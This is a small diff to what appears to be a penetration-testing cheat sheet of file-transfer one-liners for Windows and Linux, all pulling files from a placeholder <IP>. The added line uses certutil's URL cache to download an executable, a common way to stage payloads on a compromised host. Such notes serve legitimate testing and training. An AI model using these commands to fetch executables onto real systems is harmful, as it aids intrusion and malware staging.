@@ -11,11 +11,11 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.
 iwr -uri http://<IP>/file -Outfile file
 wget http://<IP>/file -O file
 curl http://<IP>/file -o file
+certutil -urlcache -f http://<IP>:803/ok.exe ok.exe  
 ```
 
 -> Linux
 ```
-curl http://<IP>/file
 wget http://<IP>/file
 curl  http://<IP>/file > file
 ```
